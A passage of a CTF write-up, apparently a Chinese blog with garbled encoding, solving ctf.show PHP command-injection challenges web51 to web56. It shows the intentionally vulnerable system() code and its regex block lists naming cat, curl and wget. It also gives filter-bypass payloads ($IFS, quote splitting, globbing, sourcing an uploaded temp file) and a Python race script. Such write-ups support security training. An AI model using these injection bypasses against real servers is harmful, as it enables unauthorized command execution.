</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:50:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>æˆ‘æµ‹æ€ä¹ˆè¿&lt; &gt;éƒ½è¦è¿‡æ»¤</p>
<p>åˆ«å¿˜äº†è¿˜å¯ä»¥ç”¨$IFS</p>
<pre tabindex="0"><code>ca%27%27t$IFS/fla%27%27g||
or
ca%27%27t$IFS/fla%27%27g%0a
</code></pre><h4 id="web52">web52<a hidden class="anchor" aria-hidden="true" href="#web52">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 18:21:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/</p></blockquote>
<p>è¿™é¢˜æ²¡æœ‰åœ¨åé¢è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œå…¶ä»–å’Œä¸Šä¸€é¢˜ä¸€æ ·</p>
<pre tabindex="0"><code>c%27%27at${IFS}fla%27%27g.php
</code></pre><h4 id="web54">web54<a hidden class="anchor" aria-hidden="true" href="#web54">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 19:43:42
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤,é¢˜ç›®é€šè¿‡*ä½¿å¾—åªè¦æ˜¯ä¼ å…¥çš„å†…å®¹å‡ºç°å¦‚catä¸‰ä¸ªå­—ç¬¦å³å¯è¢«åŒ¹é…åˆ°ï¼Œæ— æ³•ä½¿ç”¨ä¹‹å‰çš„å­—ç¬¦æ‹¼æ¥æ–¹æ³•ç»•è¿‡</p>
<p>è¿™é¢˜æ²¡è¿‡ç‡é€šé…ç¬¦?</p>
<p>è§£ä¸€</p>
<pre tabindex="0"><code>/bin/?at${IFS}f???????
</code></pre><p>catå‘½ä»¤æ‰€åœ¨çš„è·¯å¾„æ˜¯åœ¨/bin/ç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºç›´æ¥è°ƒç”¨äº†catæ–‡ä»¶æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œçš„catå¯ä»¥çœ‹ä½œå‘½ä»¤ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥é€šé…ç¬¦å¯ä»¥ç”¨åœ¨è¿™ä¸Šé¢ï¼ˆä¸€å¼€å§‹è¿˜å‚»å‚»çš„æ¢æˆuniqçœ‹èƒ½ä¸èƒ½ç”¨hhhï¼‰ã€‚</p>
<p>binä¸‹çš„å‘½ä»¤ï¼š<a href="https://www.cnblogs.com/cuiqi1314/articles/7339776.html">Linux /bin ç›®å½•ä¸‹å‘½ä»¤ç®€è¦è¯´æ˜ - å´”æ—— - åšå®¢å›­</a></p>
<p>åŒç†binç›®å½•ä¸‹è¿˜å­˜åœ¨moreï¼Œæ‰€ä»¥è¿™é‡Œçš„catæˆ‘ä»¬æ¢æˆmoreä¹Ÿå¯ä»¥è¯»å–flagã€‚
è§£äºŒ</p>
<pre tabindex="0"><code>vi${IFS}fla?.php 
or
c=uniq${IFS}f???.php //å€’åºçš„
or
grep${IFS}%27fla%27${IFS}f???????%0a
</code></pre><h4 id="web55">web55<a hidden class="anchor" aria-hidden="true" href="#web55">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 20:03:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<pre tabindex="0"><code>\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/
</code></pre><p>è¿™é¢˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<p>ä¹Ÿå°±æ˜¯<strong>æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ</strong></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108557067">https://blog.csdn.net/qq_46091464/article/details/108557067</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ</a></p>
<p>æ€è·¯</p>
<blockquote>
<ol>
<li>shellä¸‹å¯ä»¥åˆ©ç”¨<code>.</code>æ¥æ‰§è¡Œä»»æ„è„šæœ¬</li>
<li>Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿</li>
</ol></blockquote>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¸€ä¸ªæ–‡ä»¶(æ–‡ä»¶é‡Œé¢çš„shå‘½ä»¤)ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡<code>.(ç‚¹)</code>å»æ‰§è¡Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚(å½¢æˆäº†æ¡ä»¶ç«äº‰)ã€‚ä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ–‡ä»¶åœ¨linuxä¸‹é¢ä¿å­˜åœ¨<code>/tmp/php??????</code>ä¸€èˆ¬åé¢çš„6ä¸ªå­—ç¬¦æ˜¯éšæœºç”Ÿæˆçš„æœ‰å¤§å°å†™ã€‚ï¼ˆå¯ä»¥é€šè¿‡linuxçš„åŒ¹é…ç¬¦å»åŒ¹é…ï¼‰</p>
<blockquote>
<pre tabindex="0"><code>æ³¨æ„ï¼šé€šè¿‡`.`å»æ‰§è¡Œshå‘½ä»¤ä¸éœ€è¦æœ‰æ‰§è¡Œæƒé™
</code></pre></blockquote>
<p>1.æ„é€ postæ•°æ®åŒ…</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POSTæ•°æ®åŒ…POC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>æ–‡ä»¶åï¼š<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;æäº¤&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>åœ¨ä¸Šä¼ çš„æ–‡ä»¶é‡Œé¢å†™å…¥shæŒ‡ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="cp"></span>ls
</span></span></code></pre></div><p>2.æŠ“åŒ…</p>
<p><img alt="image-20241127181502002" loading="lazy" src="assets/image-20241127181502002.png"></p>
<p>3.æ„é€ æ‰§è¡Œshå‘½ä»¤çš„poc</p>
<p>è¯¦ç»†è§£é‡Špocçš„æ„é€ ï¼š</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob</a></p>
<p>æˆ‘ä»¬è¿™é‡Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬è¿™é“é¢˜é‡Œé¢çš„å¹²æ‰°æ–‡ä»¶åéƒ½æ˜¯ç”±å°å†™å­—æ¯ç»„æˆçš„ï¼Œæ‰€æœ‰æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹çš„poc</p>
<pre tabindex="0"><code>?c=.+/???/????????[@-[]
</code></pre><p>æ³¨ï¼šåé¢çš„<code>[@-[]</code>æ˜¯linuxä¸‹é¢çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯ã€‚
<img alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy" src="https://i-blog.csdnimg.cn/blog_migrate/fcbf237f846ebf0be65c4c9aceaf3714.png#pic_center"></p>
<p>æˆ‘ä»¬å°±æ¥å§</p>
<p><img alt="image-20241127233056280" loading="lazy" src="assets/image-20241127233056280.png"></p>
<p>ä¿®æ”¹ä¸€ä¸‹æŒ‡ä»¤å†…å®¹å³å¯å¾—åˆ°flag</p>
<p><img alt="image-20241127233144783" loading="lazy" src="assets/image-20241127233144783.png"></p>
<h4 id="web56">web56<a hidden class="anchor" aria-hidden="true" href="#web56">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|</span><span class="se">\\</span><span class="s2">$|\(|\{|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>;|[a-z]|[0-9]|\$|(|{|'|&quot;|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªæ•°å­—ï¼Œä¸å½±å“æˆ‘ä»¬ä¸Šé¢˜çš„è§£é¢˜æ–¹æ³•</p>
<p>è¿™é‡Œä¸å†èµ˜è¿°</p>
<p>æ”¾ä¸ªå¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">	<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&#34;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;feng.txt&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">	<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl">		<span class="k">break</span>
</span></span></code></pre></div><h4 id="web57">web57<a hidden class="anchor" aria-hidden="true" href="#web57">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-08 01:02:56
